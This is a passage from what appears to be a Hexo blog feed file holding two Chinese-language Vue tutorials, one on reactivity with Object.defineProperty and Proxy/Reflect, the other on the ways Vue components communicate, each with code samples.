class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><ol><li>调用$mount()函数进入到挂载阶段</li><li>检查是否有render()函数，根据上述模版创建render()函数</li><li>调用了mountComponent()函数完成挂载，并在mountComponen()中定义并初始化updateComponent()</li><li>为渲染函数添加观察者，在观察者中对渲染函数求值</li><li>在求值的过程中触发数据对象str的get，在str的get中收集str的观察者到数据的dep中</li><li>修改str的值时，触发str的set，在set中调用数据的dep的notify触发响应</li><li>notify中对每一个观察者调用update方法更新视图</li></ol><hr><p>总结下官方的描述,大概分为一下几点：</p><ul><li>组件实例有自己的watcher对象，用于记录数据依赖</li><li>组件中的data的每个属性都有自己的getter、setter方法，用于收集依赖和触发依赖</li><li>组件渲染过程中，调用data中的属性的getter方法，将依赖收集至watcher对象</li><li>data中的属性变化，会调用setter中的方法，告诉watcher有依赖发生了变化</li><li>watcher收到依赖变化的消息，重新渲染虚拟dom，实现页面响应</li></ul><h3 id="Vue-3-0-Proxy"><a href="#Vue-3-0-Proxy" class="headerlink" title="Vue 3.0 Proxy"></a>Vue 3.0 Proxy</h3><blockquote><p> Object.defineProperty 只能劫持对象的属性,因此我们需要对每个对象的每个属性进行遍历。Vue 2.x 里,是通过 递归 + 遍历 data 对象来实现对数据的监控的,如果属性值也是对象那么需要深度遍历,显然如果能劫持一个完整的对象是才是更好的选择。Proxy 可以劫持整个对象,并返回一个新的对象。Proxy 不仅可以代理对象,还可以代理数组。还可以代理动态增加的属性。</p></blockquote><p> Proxy可以理解成，在目标对象之前架设一层 “拦截”，当外界对该对象访问的时候，都必须经过这层拦截，而Proxy就充当了这种机制，类似于代理的含义，它可以对外界访问对象之前进行过滤和改写该对象。 </p><blockquote><p>proxy不存在Object.defineProperty()的三个问题,并且Proxy有多达13种拦截方法 </p></blockquote>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var proxy = new Proxy(target, handler);</span><br></pre></td></tr></table></figure><blockquote><p><code>new Proxy()</code>表示生成一个<code>Proxy</code>实例，<code>target</code>参数表示所要拦截的目标对象，<code>handler</code>参数也是一个对象，用来定制拦截行为</p></blockquote>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">  name: <span class="string">'Eason'</span>,</span><br><span class="line">  age: <span class="number">30</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> handler = &#123;</span><br><span class="line">  get (target, key, receiver) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'get'</span>, key)                   <span class="comment">// 如果什么操作也没有就直接return Reflect..</span></span><br><span class="line">    <span class="comment">// return target[key]</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Reflect</span>.get(target, key, receiver) <span class="comment">//函数式行为</span></span><br><span class="line">  &#125;,</span><br><span class="line">  set (target, key, value, receiver) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'set'</span>, key, value)</span><br><span class="line">    <span class="comment">// target[key] = value</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Reflect</span>.set(target, key, value, receiver)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> proxy = <span class="keyword">new</span> <span class="built_in">Proxy</span>(obj, handler)</span><br><span class="line"></span><br><span class="line">proxy.name = <span class="string">'Zoe'</span> <span class="comment">// set name Zoe</span></span><br><span class="line">proxy.age = <span class="number">18</span>     <span class="comment">// set age 18</span></span><br><span class="line">proxy.name         <span class="comment">//22 get name</span></span><br><span class="line">              <span class="comment">//"Eason"</span></span><br></pre></td></tr></table></figure><ul><li><code>proxy</code> 读取属性的值时，实际上执行的是 <code>Handler.get</code> ：在控制台输出信息，并且读取被代理对象 <code>obj</code> 的属性。</li><li><p>在 <code>proxy</code> 设置属性值时，实际上执行的是 <code>Handler.set</code> ：在控制台输出信息，并且设置被代理对象 <code>obj</code> 的属性的值</p><blockquote><p>Reflect是一个内置的对象，没有构造函数，所有的属性与方法都是静态的（就像Math对象）</p><p>Reflect.get():获取对象身上某个属性的值，类似于 target[name]。</p><p>Reflect.set():将值分配给属性的函数,返回一个Boolean，如果更新成功，则返回true。 </p><p>Reflect对象的静态方法和Proxy对象的静态方法一一对应 ，一共13种</p><p>Reflect设计的目的是为了优化Object的一些操作方法以及合理的返回Object操作返回的结果，对于一些命令式的Object行为，Reflect对象可以将其变为函数式的行为 </p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    name: <span class="string">'ace'</span>,</span><br><span class="line">    age: <span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'name'</span> <span class="keyword">in</span> obj)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">delete</span> obj[<span class="string">'age'</span>])</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.keys(obj))</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Reflect</span>.has(obj, <span class="string">'name'</span>))</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Reflect</span>.deleteProperty(obj, <span class="string">'age'</span>))</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Reflect</span>.ownKeys(obj))</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Reflect</span>.apply(target, thisArgument, argumentsList)</span><br><span class="line"><span class="comment">// 对一个函数进行调用操作，同时可以传入一个数组作为调用参数。和 Function.prototype.apply() 功能类似。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Reflect</span>.construct(target, argumentsList[, newTarget])</span><br><span class="line"><span class="comment">// 对构造函数进行 new 操作，相当于执行 new target(...args)。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Reflect</span>.defineProperty(target, propertyKey, attributes)</span><br><span class="line"><span class="comment">// 和 Object.defineProperty() 类似。如果设置成功就会返回 true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Reflect</span>.deleteProperty(target, propertyKey)</span><br><span class="line"><span class="comment">//作为函数的delete操作符，相当于执行 delete target[name]。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Reflect</span>.get(target, propertyKey[, receiver])</span><br><span class="line"><span class="comment">// 获取对象身上某个属性的值，类似于 target[name]。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Reflect</span>.getOwnPropertyDescriptor(target, propertyKey)</span><br><span class="line"><span class="comment">// 类似于 Object.getOwnPropertyDescriptor()。如果对象中存在该属性，则返回对应的属性描述符,  否则返回 undefined.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Reflect</span>.getPrototypeOf(target)</span><br><span class="line"><span class="comment">// 类似于 Object.getPrototypeOf()。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Reflect</span>.has(target, propertyKey)</span><br><span class="line"><span class="comment">// 判断一个对象是否存在某个属性，和 in 运算符 的功能完全相同。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Reflect</span>.isExtensible(target)</span><br><span class="line"><span class="comment">// 类似于 Object.isExtensible().</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Reflect</span>.ownKeys(target)</span><br><span class="line"><span class="comment">// 返回一个包含所有自身属性（不包含继承属性）的数组。(类似于 Object.keys(), 但不会受enumerable影响).</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Reflect</span>.preventExtensions(target)</span><br><span class="line"><span class="comment">// 类似于 Object.preventExtensions()。返回一个Boolean。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Reflect</span>.set(target, propertyKey, value[, receiver])</span><br><span class="line"><span class="comment">// 将值分配给属性的函数。返回一个Boolean，如果更新成功，则返回true。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Reflect</span>.setPrototypeOf(target, prototype)</span><br><span class="line"><span class="comment">// 设置对象原型的函数. 返回一个 Boolean， 如果更新成功，则返回true。</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>整理-Vue组件通信的方式</title>
      <link href="2020/11/12/%E6%95%B4%E7%90%86-Vue%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1%E7%9A%84%E6%96%B9%E5%BC%8F/"/>
      <url>2020/11/12/%E6%95%B4%E7%90%86-Vue%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1%E7%9A%84%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<ul><li>$root / $parent / $children</li><li>$refs</li><li>provide / inject</li><li>$attrs / $listeners</li><li>props / $emit</li><li>vuex</li><li>EventBus</li><li>v-model</li></ul><a id="more"></a><h2 id="root"><a href="#root" class="headerlink" title="$root"></a>$root</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;!--</span><br><span class="line">      小型应用中可以在 vue 根实例里存储共享数据</span><br><span class="line">      组件中可以通过 $root 访问根实例</span><br><span class="line">    --&gt;</span><br><span class="line">    $root.title：&#123;&#123; $root.title &#125;&#125;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;button @click=&quot;$root.title = &apos;Hello $root&apos;&quot;&gt;改变 title&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><h2 id="parent-children"><a href="#parent-children" class="headerlink" title="$parent/$children"></a>$parent/$children</h2><p>指定已创建的实例之父实例，在两者之间建立父子关系。子实例可以用 <code>this.$parent</code> 访问父实例，子实例被推入父实例的 <code>$children</code> 数组中。</p><p>节制地使用 <code>$parent</code> 和 <code>$children</code> - 它们的主要目的是作为访问组件的应急方法。更推荐用 props 和 events 实现父子组件通信</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- parent.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;parent&quot;&gt;</span><br><span class="line">    parent</span><br><span class="line">    &lt;child&gt;&lt;/child&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  components: &#123;</span><br><span class="line">    child</span><br><span class="line">  &#125;,</span><br><span class="line">  data () &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      title: &apos;获取父组件实例&apos;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    handle () &#123;</span><br><span class="line">      console.log(this.title)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- children.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;child&quot;&gt;</span><br><span class="line">    child&lt;br&gt;</span><br><span class="line">    $parent.title：&#123;&#123; $parent.title &#125;&#125;&lt;br&gt;</span><br><span class="line">    &lt;button @click=&quot;$parent.handle&quot;&gt;获取 $parent.title&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;$parent.title = &apos;Hello $parent.title&apos;&quot;&gt;改变 $parent.title&lt;/button&gt;</span><br><span class="line">  </span><br><span class="line">    &lt;grandson&gt;&lt;/grandson&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><h2 id="refs"><a href="#refs" class="headerlink" title="$refs"></a>$refs</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- parent.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;myinput ref=&quot;mytxt&quot;&gt;&lt;/myinput&gt;</span><br><span class="line">    &lt;button @click=&quot;focus&quot;&gt;获取焦点&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  components: &#123;</span><br><span class="line">    myinput</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    focus () &#123;</span><br><span class="line">      this.$refs.mytxt.focus() // 调用的是子组件的 focus 方法</span><br><span class="line">      this.$refs.mytxt.value = &apos;hello&apos;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- myinput.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;input v-model=&quot;value&quot; type=&quot;text&quot; ref=&quot;txt&quot;&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  data () &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      value: &apos;default&apos;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    focus () &#123;</span><br><span class="line">      this.$refs.txt.focus() // this.$refs.txt 获取 DOM 对象，focus 方法获取焦点</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="provide-inject"><a href="#provide-inject" class="headerlink" title="provide/inject"></a>provide/inject</h2><blockquote><p><code>provide</code> 和 <code>inject</code> 主要在开发高阶插件/组件库时使用。并不推荐用于普通应用程序代码中。</p></blockquote><p>这对选项需要一起使用，以允许一个祖先组件向其所有子孙后代注入一个依赖，不论组件层次有多深，并在其上下游关系成立的时间里始终生效。如果你熟悉 React，这与 React 的上下文特性很相似。</p><p><strong>提示：<code>provide</code> 和 <code>inject</code> 绑定并不是可响应的。这是刻意为之的。然而，如果你传入了一个可监听的对象，那么其对象的 property 还是可响应的。并且在子组件中不可修改</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 父级组件提供 'foo'</span></span><br><span class="line"><span class="keyword">var</span> Provider = &#123;</span><br><span class="line">  provide: &#123;</span><br><span class="line">    foo: <span class="string">'bar'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子组件注入 'foo'</span></span><br><span class="line"><span class="keyword">var</span> Child = &#123;</span><br><span class="line">  inject: [<span class="string">'foo'</span>],</span><br><span class="line">  created () &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.foo) <span class="comment">// =&gt; "bar"</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="attrs-listeners"><a href="#attrs-listeners" class="headerlink" title="$attrs / $listeners"></a>$attrs / $listeners</h2><ul><li>$attrs ：把父组件中非 prop 属性绑定到内部组件</li><li><p>$listeners：把父组件中的 DOM 对象的原生事件绑定到内部组件</p></li><li><p>可查看文章<a href="https://www.cnblogs.com/chanwahfung/p/11520909.html" target="_blank" rel="noopener">Vue - 组件通信之$attrs、$listeners</a></p></li></ul><h2 id="props-emit"><a href="#props-emit" class="headerlink" title="props / $emit"></a>props / $emit</h2><h4 id="父组件传子组件：通过props"><a href="#父组件传子组件：通过props" class="headerlink" title="父组件传子组件：通过props"></a>父组件传子组件：通过props</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--父组件--&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;我是父组件,我的值是&#123;&#123; msg &#125;&#125;</span><br><span class="line">        &lt;child :logo=&quot;msg&quot;&gt;&lt;/child&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import child from &apos;./child&apos;</span><br><span class="line">export default &#123;</span><br><span class="line">  data () &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      msg: &apos;123&apos;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  components: &#123;</span><br><span class="line">    child</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!--子组件--&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;div&gt;我是子组件,这是父组件的值：&#123;&#123; logo &#125;&#125;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &apos;child&apos;,</span><br><span class="line">  data () &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  props: [&apos;logo&apos;]</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">我是父组件,我的值是123</span><br><span class="line">我是子组件,这是父组件的值：123</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><h4 id="子组件传父组件：-emit"><a href="#子组件传父组件：-emit" class="headerlink" title="子组件传父组件：$emit"></a>子组件传父组件：$emit</h4><ul><li>输入框的onchange事件，要在 input 失去焦点的时候才会触发；</li><li>oninput 事件在用户输入时触发，它是在元素值发生变化时立即触发；</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--父组件--&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;child @transfer=&quot;get&quot;&gt;&lt;/child&gt;</span><br><span class="line">        &lt;div&gt;我是父组件：这是子组件传来的值：&#123;&#123; msg &#125;&#125;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import child from &apos;./child&apos;</span><br><span class="line">export default &#123;</span><br><span class="line">  data () &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      msg: &apos;&apos;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  components: &#123;</span><br><span class="line">    child</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    get (msg) &#123;</span><br><span class="line">      this.msg = msg</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--子组件--&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; v-model=&quot;msg&quot; @input=&quot;set&quot;&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &apos;child&apos;,</span><br><span class="line">  data () &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      msg: &apos;&apos;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    set: function () &#123;</span><br><span class="line">      this.$emit(&apos;transfer&apos;, this.msg)</span><br><span class="line">      console.log(1)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">    23131 //输入框</span><br><span class="line">    我是父组件：这是子组件传来的值：23131</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><h2 id="vuex"><a href="#vuex" class="headerlink" title="vuex"></a>vuex</h2><p><a href="https://www.jinjingxuan.com/2020/10/22/%E6%95%B4%E7%90%86-Vuex/#more" target="_blank" rel="noopener">vuex</a></p><h2 id="event-bus"><a href="#event-bus" class="headerlink" title="event bus"></a>event bus</h2><p>一个完整的eventBus主要分为三个部分：<strong>eventBus组件、注册事件（$on）、发送事件（$emit）</strong></p><h2 id="v-model"><a href="#v-model" class="headerlink" title="v-model"></a>v-model</h2><p>父组件通过v-model传递值给子组件时，会自动传递一个value的prop属性，在子组件中通过this.$emit(‘input’,val)自动修改v-model绑定的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Vue.component(&apos;child&apos;,&#123;</span><br><span class="line">    props:&#123;</span><br><span class="line">      value:String, //v-model会自动传递一个字段为value的prop属性</span><br><span class="line">    &#125;,</span><br><span class="line">    data()&#123;</span><br><span class="line">      return &#123;</span><br><span class="line">        mymessage:this.value</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line">      changeValue()&#123;</span><br><span class="line">        this.$emit(&apos;input&apos;,this.mymessage);//通过如此调用可以改变父组件上v-model绑定的值</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    template:`</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; v-model=&quot;mymessage&quot; @change=&quot;changeValue&quot;&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  Vue.component(&apos;parent&apos;,&#123;</span><br><span class="line">    template:`</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;p&gt;this is parent compoent!&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;&#123;&#123;message&#125;&#125;&lt;/p&gt;</span><br><span class="line">        &lt;child v-model=&quot;message&quot;&gt;&lt;/child&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    `,</span><br><span class="line">    data()&#123;</span><br><span class="line">      return &#123;</span><br><span class="line">        message:&apos;hello&apos;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
